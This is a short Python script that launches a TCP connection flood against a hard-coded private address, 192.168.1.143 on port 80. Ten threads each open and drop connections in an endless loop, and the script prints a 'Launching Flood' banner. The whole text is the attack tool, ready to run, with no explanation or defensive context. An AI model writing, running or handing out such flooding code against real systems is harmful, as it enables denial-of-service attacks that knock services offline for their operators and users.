import socket
import threading

target_ip = "192.168.1.143"
target_port = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.connect((target_ip, target_port))
            s.close()
        except:
            pass

print(f"--- Launching Flood on {target_ip}:{target_port} ---")
for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()